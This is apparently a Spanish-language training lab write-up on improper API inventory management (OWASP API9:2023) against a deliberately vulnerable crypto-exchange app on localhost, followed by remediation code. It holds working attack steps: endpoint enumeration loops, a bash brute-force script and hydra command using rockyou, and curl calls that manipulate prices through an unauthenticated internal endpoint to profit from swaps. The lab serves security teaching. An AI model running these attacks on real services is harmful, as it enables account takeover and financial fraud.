# LAB 09 - Gestion de Inventario Inadecuada

## Referencia OWASP: API9:2023 - Improper Inventory Management

---

## Objetivo

Descubrir y explotar endpoints no documentados, versiones beta y servicios internos expuestos en la plataforma CryptoVulnX para:

1. Realizar fuerza bruta ilimitada contra una version beta del login sin rate limiting.
2. Acceder a un servicio interno de cotizaciones que expone informacion de infraestructura.
3. Manipular precios de criptomonedas a traves de un endpoint interno expuesto publicamente.

---

## Contexto

La vulnerabilidad API9:2023 se produce cuando una organizacion no mantiene un inventario adecuado de sus APIs. Esto incluye versiones antiguas o beta que siguen accesibles, endpoints internos expuestos accidentalmente a internet, y documentacion desactualizada que no refleja todos los endpoints existentes.

En CryptoVulnX existen tres hallazgos criticos relacionados con esta vulnerabilidad:

1. **Endpoint beta v2 de login**: Existe una version `/api/v2/auth/login.php` que fue desplegada como prueba y nunca fue descomisionada. Esta version no implementa rate limiting (lo confirma explicitamente en la respuesta con `rate_limit: none`) y ademas expone la consulta SQL ejecutada en un campo `debug`, facilitando tanto la fuerza bruta como la inyeccion SQL.

2. **Servicio interno de cotizaciones (GET)**: El endpoint `/api/internal/rates.php` fue disenado para comunicacion entre microservicios internos, pero quedo expuesto en el servidor web publico sin autenticacion. Las respuestas incluyen informacion de infraestructura como `hostname` y `db_host`.

3. **Servicio interno de cotizaciones (POST)**: El mismo endpoint acepta solicitudes POST que permiten **actualizar los precios de las criptomonedas** directamente en la base de datos, sin requerir autenticacion ni autorizacion alguna. Un atacante puede manipular los precios y luego ejecutar swaps a tasas favorables.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `POST` | `/api/v2/auth/login.php` | Version beta del login (sin rate limit, con campo debug) |
| `GET` | `/api/internal/rates.php` | Servicio interno de cotizaciones (expone hostname, db_host) |
| `POST` | `/api/internal/rates.php` | Actualizacion de precios de criptomonedas (sin autenticacion) |

---

## Dificultad

**Media** - Requiere habilidades de reconocimiento y enumeracion para descubrir los endpoints ocultos, y comprension de logica de negocio para explotarlos.

---

## Pistas

<details>
<summary>Pista 1 - Descubrimiento</summary>

La API documentada usa `/api/v1/`. ¿Has intentado cambiar la version en la URL? Prueba con `/api/v2/` y `/api/internal/`. Tambien puedes usar herramientas de fuzzing de directorios como `gobuster` o `ffuf` para descubrir rutas no documentadas.

</details>

<details>
<summary>Pista 2 - Analisis del endpoint beta</summary>

El endpoint `/api/v2/auth/login.php` devuelve mas informacion que la version v1. Observa los campos `debug` y `rate_limit` en la respuesta. El campo `rate_limit: none` confirma que no hay limite de intentos. Puedes usar `hydra` o un script de Bash para realizar fuerza bruta sin restricciones.

</details>

<details>
<summary>Pista 3 - Manipulacion de precios</summary>

El endpoint `/api/internal/rates.php` acepta tanto GET como POST. Con GET obtienes los precios actuales e informacion del servidor. Con POST puedes enviar un JSON con `{"rates":{"BTC":"<nuevo_precio>"}}` para modificar el precio de BTC. Despues de modificar el precio, usa `/api/v1/crypto/swap.php` para comprar a precio manipulado, restaura el precio original, y vende con ganancia.

</details>

---

## Solucion

### Solucion 1: Fuerza Bruta via Endpoint Beta v2

**Paso 1**: Descubrir el endpoint beta mediante enumeracion de versiones.

```bash
# Probar diferentes versiones de la API
for VERSION in v1 v2 v3 beta internal; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      http://localhost/appsec/api/$VERSION/auth/login.php)
    echo "api/$VERSION/auth/login.php -> HTTP $STATUS"
done
```

Resultado esperado:
```
api/v1/auth/login.php -> HTTP 200
api/v2/auth/login.php -> HTTP 200
api/v3/auth/login.php -> HTTP 404
api/beta/auth/login.php -> HTTP 404
api/internal/auth/login.php -> HTTP 404
```

**Paso 2**: Comparar las respuestas entre v1 y v2.

```bash
# Login v1 (con rate limiting)
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@cryptovulnx.com","password":"wrongpass"}'
```

Respuesta v1:
```json
{
  "status": "error",
  "message": "Credenciales invalidas",
  "attempts_remaining": 4
}
```

```bash
# Login v2 (beta - sin rate limiting)
curl -s -X POST http://localhost/appsec/api/v2/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@cryptovulnx.com","password":"wrongpass"}'
```

Respuesta v2 (mucho mas verbosa):
```json
{
  "status": "error",
  "message": "Credenciales invalidas",
  "rate_limit": "none",
  "debug": {
    "query": "SELECT * FROM users WHERE email = 'admin@cryptovulnx.com'",
    "execution_time_ms": 2.4,
    "rows_found": 1
  },
  "api_version": "2.0-beta",
  "timestamp": "2026-03-28T14:30:00Z"
}
```

Observar: el campo `rate_limit: none` confirma la ausencia de limites y el campo `debug` expone la consulta SQL.

**Paso 3**: Ejecutar fuerza bruta sin restricciones.

```bash
#!/bin/bash
# brute_force_v2.sh - Fuerza bruta contra el endpoint beta sin rate limit

TARGET="http://localhost/appsec/api/v2/auth/login.php"
EMAIL="admin@cryptovulnx.com"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Iniciando fuerza bruta contra v2 beta (sin rate limit)..."
echo "[*] Objetivo: $EMAIL"

while IFS= read -r PASSWORD; do
    RESP=$(curl -s -X POST "$TARGET" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}")

    STATUS=$(echo "$RESP" | python -c "import sys,json; print(json.load(sys.stdin).get('status',''))" 2>/dev/null)

    if [ "$STATUS" = "success" ]; then
        TOKEN=$(echo "$RESP" | python -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
        echo "[+] PASSWORD ENCONTRADA: $PASSWORD"
        echo "[+] Token JWT: $TOKEN"
        break
    fi
done < "$WORDLIST"
```

Tambien se puede usar `hydra`:

```bash
hydra -l admin@cryptovulnx.com -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/appsec/api/v2/auth/login.php:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Credenciales invalidas" \
  -t 50
```

---

### Solucion 2: Acceso al Servicio Interno de Cotizaciones

**Paso 1**: Descubrir el endpoint interno.

```bash
# Enumerar rutas internas
for ENDPOINT in rates users admin config health status; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      http://localhost/appsec/api/internal/$ENDPOINT.php)
    echo "api/internal/$ENDPOINT.php -> HTTP $STATUS"
done
```

Resultado esperado:
```
api/internal/rates.php -> HTTP 200
api/internal/users.php -> HTTP 404
api/internal/admin.php -> HTTP 404
api/internal/config.php -> HTTP 404
api/internal/health.php -> HTTP 404
api/internal/status.php -> HTTP 404
```

**Paso 2**: Acceder al endpoint interno de cotizaciones.

```bash
curl -s http://localhost/appsec/api/internal/rates.php
```

Respuesta esperada:
```json
{
  "status": "success",
  "rates": {
    "BTC": "67542.50",
    "ETH": "3521.80",
    "SOL": "142.30",
    "ADA": "0.65",
    "XRP": "0.58",
    "USDT": "1.00"
  },
  "last_updated": "2026-03-28T14:25:00Z",
  "source": "internal_feed",
  "server_info": {
    "hostname": "ip-10-0-1-25.ec2.internal",
    "db_host": "10.0.1.50",
    "db_name": "cryptovulnx_db",
    "cache_ttl": 60,
    "api_version": "internal-1.0"
  }
}
```

El campo `server_info` revela el hostname interno del servidor (`ip-10-0-1-25.ec2.internal`), la direccion IP de la base de datos (`10.0.1.50`) y el nombre de la base de datos.

---

### Solucion 3: Manipulacion de Precios para Obtener Ganancias

**Paso 1**: Autenticarse con una cuenta normal.

```bash
TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"password123"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

**Paso 2**: Verificar el saldo actual.

```bash
curl -s http://localhost/appsec/api/v1/wallet/balance.php \
  -H "Authorization: Bearer $TOKEN"
```

Respuesta:
```json
{
  "status": "success",
  "balances": {
    "USDT": "10000.00",
    "BTC": "0.00",
    "ETH": "0.00"
  }
}
```

**Paso 3**: Manipular el precio de BTC a un valor irrisorio.

```bash
curl -s -X POST http://localhost/appsec/api/internal/rates.php \
  -H "Content-Type: application/json" \
  -d '{"rates":{"BTC":"1.00"}}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Precios actualizados",
  "updated_rates": {
    "BTC": "1.00"
  },
  "previous_rates": {
    "BTC": "67542.50"
  }
}
```

**Paso 4**: Comprar BTC al precio manipulado (1 USDT = 1 BTC).

```bash
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"USDT","to":"BTC","amount":10000}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "swap": {
    "from": "USDT",
    "to": "BTC",
    "amount_sent": "10000.00",
    "amount_received": "10000.00",
    "rate": "1.00",
    "fee": "0.00"
  }
}
```

Ahora tenemos 10,000 BTC (que normalmente valdrian $675,425,000 USD).

**Paso 5**: Restaurar el precio original de BTC.

```bash
curl -s -X POST http://localhost/appsec/api/internal/rates.php \
  -H "Content-Type: application/json" \
  -d '{"rates":{"BTC":"67542.50"}}'
```

**Paso 6**: Vender BTC al precio real para obtener ganancias masivas.

```bash
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"BTC","to":"USDT","amount":10000}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "swap": {
    "from": "BTC",
    "to": "USDT",
    "amount_sent": "10000.00",
    "amount_received": "675425000.00",
    "rate": "67542.50",
    "fee": "0.00"
  }
}
```

**Resultado**: Inversion de 10,000 USDT convertida en 675,425,000 USDT mediante manipulacion de precios.

**Paso 7**: Verificar saldo final.

```bash
curl -s http://localhost/appsec/api/v1/wallet/balance.php \
  -H "Authorization: Bearer $TOKEN"
```

Respuesta:
```json
{
  "status": "success",
  "balances": {
    "USDT": "675425000.00",
    "BTC": "0.00",
    "ETH": "0.00"
  }
}
```

---

## Remediacion

### 1. Inventario Completo de APIs y Descomision de Versiones Beta

```php
<?php
// api/v2/auth/login.php - ELIMINAR o redirigir a v1

// Opcion A: Eliminar el archivo completamente
// rm -rf api/v2/

// Opcion B: Redirigir a la version estable
http_response_code(301);
header("Location: /appsec/api/v1/auth/login.php");
echo json_encode([
    "status" => "error",
    "message" => "Esta version de la API ha sido deprecada. Use /api/v1/"
]);
exit;
```

### 2. Proteger Endpoints Internos con Reglas de Red

```apache
# .htaccess - Bloquear acceso externo a endpoints internos

<LocationMatch "^/appsec/api/internal/">
    # Solo permitir acceso desde IPs internas
    Require ip 10.0.0.0/8
    Require ip 172.16.0.0/12
    Require ip 192.168.0.0/16
    Require ip 127.0.0.1
</LocationMatch>
```

Alternativamente, validar en el propio PHP:

```php
<?php
// api/internal/rates.php - Proteccion por IP y autenticacion

// Verificar que la solicitud proviene de la red interna
$allowed_networks = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.1'];
$client_ip = $_SERVER['REMOTE_ADDR'];
$is_internal = false;

foreach ($allowed_networks as $network) {
    if (ipInRange($client_ip, $network)) {
        $is_internal = true;
        break;
    }
}

if (!$is_internal) {
    http_response_code(403);
    echo json_encode(["error" => "Acceso denegado"]);
    exit;
}

// Ademas, requerir un token de servicio interno
$service_token = $_SERVER['HTTP_X_SERVICE_TOKEN'] ?? '';
$valid_token = getenv('INTERNAL_SERVICE_TOKEN');

if (!hash_equals($valid_token, $service_token)) {
    http_response_code(401);
    echo json_encode(["error" => "Token de servicio invalido"]);
    exit;
}
```

### 3. Eliminar Informacion de Debug y Servidor

```php
<?php
// api/internal/rates.php - Respuesta limpia sin informacion de infraestructura

// Solo devolver las cotizaciones, SIN informacion del servidor
echo json_encode([
    "status" => "success",
    "rates" => $rates,
    "last_updated" => $last_updated
    // NO incluir: hostname, db_host, db_name, api_version
]);
```

### 4. Proteger la Escritura de Precios con Autenticacion

```php
<?php
// api/internal/rates.php - POST protegido

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verificar IP interna
    if (!$is_internal) {
        http_response_code(403);
        exit;
    }

    // Verificar token de servicio
    if (!hash_equals($valid_token, $service_token)) {
        http_response_code(401);
        exit;
    }

    // Validar los precios recibidos
    $new_rates = $data['rates'] ?? [];
    $allowed_currencies = ['BTC', 'ETH', 'SOL', 'ADA', 'XRP'];

    foreach ($new_rates as $currency => $price) {
        if (!in_array($currency, $allowed_currencies)) {
            http_response_code(400);
            echo json_encode(["error" => "Moneda no permitida: $currency"]);
            exit;
        }

        if (!is_numeric($price) || (float)$price <= 0) {
            http_response_code(400);
            echo json_encode(["error" => "Precio invalido para $currency"]);
            exit;
        }

        // Validar que el cambio de precio no sea mayor al 10% respecto al actual
        $current_price = getCurrentPrice($pdo, $currency);
        $change_pct = abs(((float)$price - $current_price) / $current_price) * 100;

        if ($change_pct > 10) {
            http_response_code(400);
            echo json_encode([
                "error" => "Cambio de precio excesivo para $currency",
                "current" => $current_price,
                "proposed" => $price,
                "change_pct" => round($change_pct, 2),
                "max_allowed_pct" => 10
            ]);
            exit;
        }
    }

    // Usar prepared statements para actualizar
    $stmt = $pdo->prepare("UPDATE crypto_prices SET price = ?, updated_at = NOW() WHERE symbol = ?");
    foreach ($new_rates as $currency => $price) {
        $stmt->execute([(float)$price, $currency]);
    }

    // Registrar en log de auditoria
    $audit_stmt = $pdo->prepare(
        "INSERT INTO audit_log (action, details, source_ip, service_token_hash, created_at)
         VALUES ('price_update', ?, ?, ?, NOW())"
    );
    $audit_stmt->execute([
        json_encode($new_rates),
        $client_ip,
        hash('sha256', $service_token)
    ]);
}
```

### 5. Implementar Proceso de Gestion de Inventario de APIs

```php
<?php
// config/api_registry.php - Registro centralizado de APIs

/**
 * Registro de todas las APIs de la plataforma.
 * Cada entrada debe contener:
 * - version: version de la API
 * - status: active | deprecated | beta | internal
 * - auth_required: si requiere autenticacion
 * - network: public | internal
 * - decommission_date: fecha de descomision (si aplica)
 */
return [
    '/api/v1/auth/login.php' => [
        'version' => 'v1',
        'status' => 'active',
        'auth_required' => false,
        'network' => 'public',
        'rate_limit' => '5/minute'
    ],
    '/api/v1/crypto/swap.php' => [
        'version' => 'v1',
        'status' => 'active',
        'auth_required' => true,
        'network' => 'public',
        'rate_limit' => '10/minute'
    ],
    '/api/internal/rates.php' => [
        'version' => 'internal',
        'status' => 'active',
        'auth_required' => true,
        'network' => 'internal',
        'rate_limit' => 'none',
        'allowed_ips' => ['10.0.0.0/8']
    ],
    // NO debe existir:
    // '/api/v2/auth/login.php' -> DESCOMISIONADO
];
```
